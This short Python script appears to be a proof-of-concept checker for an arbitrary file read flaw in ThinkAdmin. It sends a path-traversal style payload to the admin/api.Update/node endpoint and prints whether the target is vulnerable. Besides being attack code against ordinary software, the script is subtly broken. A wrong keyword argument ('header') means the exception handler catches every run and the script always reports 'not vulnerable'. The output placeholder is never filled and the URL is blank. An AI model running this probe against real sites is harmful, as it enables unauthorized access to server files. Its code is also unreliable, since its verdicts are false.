import requests
from module import color_one
url=''
url1=str(url+'/admin.html?s=admin/api.Update/node').strip('\n')
headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36"}
def main():
    try:
        requests.packages.urllib3.disable_warnings()
        data1='rules=%5B%22.%2F%22%5D'
        _request=requests.post(url=url1,data=data1,header=headers,timeout=15,verify=False)
        if _request.status_code==200:
             info_result=color_one.red+'[-]{}'+'存在Thinkadmin任意文件读取漏洞'+color_one.end
             print(info_result)
        else:
            info_result = color_one.green+'[-]{}' + '不存在Thinkadmin任意文件读取漏洞' + color_one.end
            print(info_result)
    except:
        info_result=color_one.green+'[-]{}'+'不存在Thinkadmin任意文件读取漏洞'+color_one.end
        print(info_result)

